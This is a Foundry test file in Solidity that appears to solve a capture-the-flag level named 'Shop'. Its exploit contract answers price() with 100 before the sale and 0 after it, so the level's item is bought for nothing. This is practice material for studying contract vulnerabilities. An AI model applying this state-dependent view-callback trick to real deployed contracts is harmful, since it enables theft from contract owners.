// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "src/level21.sol";

contract POC is Test {
    Shop level21;
    ShopExploit attacker;

    function setUp() external {
        level21 = new Shop();
        attacker = new ShopExploit(level21);
    }

    function test() public {
        level21.isSold();
        level21.price();
        attacker.exploit();
        level21.isSold();
        level21.price();
    }
}

contract ShopExploit {
    Shop shop;

    constructor(Shop _shop) public {
        shop = _shop;
    }

    function price() external view returns (uint256) {
        if (shop.isSold()) {
            return 0;
        } else {
            return 100;
        }
    }

    function exploit() public {
        shop.buy();
    }
}
